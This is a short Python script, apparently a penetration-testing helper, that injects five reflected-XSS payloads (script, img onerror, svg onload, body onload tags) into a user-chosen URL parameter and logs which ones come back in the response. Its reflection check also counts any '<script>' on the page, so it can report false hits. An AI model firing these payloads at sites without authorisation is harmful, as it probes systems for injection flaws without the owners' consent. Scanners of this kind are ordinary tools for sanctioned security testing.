import requests
import threading
from datetime import datetime

results = []
lock = threading.Lock()

payloads = [
    '"><script>alert(1)</script>',
    "<img src=x onerror=alert(1)>",
    "<svg onload=confirm(1)>",
    "<script>console.log('injected')</script>",
    "<body onload=alert(1)>"
]

def inject_and_check(url, param, method):
    for payload in payloads:
        data = {param: payload}
        try:
            if method.upper() == "GET":
                resp = requests.get(url, params=data, timeout=10)
            else:
                resp = requests.post(url, data=data, timeout=10)

            reflected = payload in resp.text or "<script>" in resp.text

            if reflected:
                with lock:
                    results.append({
                        "url": url,
                        "param": param,
                        "payload": payload,
                        "status": resp.status_code,
                        "reflected": True,
                        "timestamp": datetime.utcnow().isoformat()
                    })
                print(f"[!] Reflected payload: {payload}")
        except Exception as e:
            with lock:
                results.append({
                    "url": url,
                    "param": param,
                    "payload": payload,
                    "error": str(e),
                    "timestamp": datetime.utcnow().isoformat()
                })
            print(f"[!] Error with {payload} -> {e}")

def run_js_injector():
    print("\n--- JS Injector ---")
    url = input("Enter target URL: ").strip()
    param = input("Parameter to inject into (e.g., q): ").strip()
    method = input("HTTP method [GET/POST]: ").strip().upper()

    t = threading.Thread(target=inject_and_check, args=(url, param, method))
    t.start()
    t.join()

    with open("js_injector_results.txt", "w") as f:
        for r in results:
            f.write(str(r) + "\n")

    print("\n[+] Injection testing complete. Results saved to js_injector_results.txt.")

